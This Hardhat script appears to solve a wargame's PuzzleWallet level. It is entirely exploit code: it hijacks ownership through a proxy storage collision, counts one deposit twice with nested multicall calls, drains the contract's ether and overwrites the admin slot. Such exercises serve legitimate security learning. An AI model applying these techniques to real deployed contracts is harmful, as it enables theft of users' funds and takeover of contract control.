const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xcE08705975b5a81eaaBD65bC619435d975A6E745";
  const PuzzleWalletContract = await ethers.getContractFactory("PuzzleWallet");
  const PuzzleWallet = PuzzleWalletContract.attach(Instance);
  const Owner = await PuzzleWallet.owner();
  console.log(Owner, "owner");

  let ABI = ["function proposeNewAdmin(address _newAdmin)"];
  let iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData("proposeNewAdmin", [owner.address]);
  const result = await owner.sendTransaction({
    from: owner.address,
    to: Instance,
    data: data,
  });
  console.log(result, "result");
  const NewOwner = await PuzzleWallet.owner();
  console.log(NewOwner);
  await PuzzleWallet.addToWhitelist(owner.address);
  const contractBalance = await ethers.provider.getBalance(Instance);
  console.log(ethers.utils.formatEther(contractBalance));
  const MultiCallData1 = PuzzleWallet.interface.encodeFunctionData("deposit");
  const MultiCallData2 = PuzzleWallet.interface.encodeFunctionData(
    "multicall",
    [[MultiCallData1]]
  );
  const tx = await PuzzleWallet.multicall([MultiCallData1, MultiCallData2], {
    value: ethers.utils.parseEther("0.001"),
  });
  console.log(tx, "tx");
  console.log([MultiCallData1, MultiCallData2]);
  const tx1 = await PuzzleWallet.execute(
    owner.address,
    ethers.utils.parseEther("0.004"),
    "0x00"
  );
  await tx1.wait(1);
  console.log(tx1, "tx1");
  await PuzzleWallet.setMaxBalance(owner.address);
  const maxBalance = await PuzzleWallet.maxBalance();
  console.log(maxBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
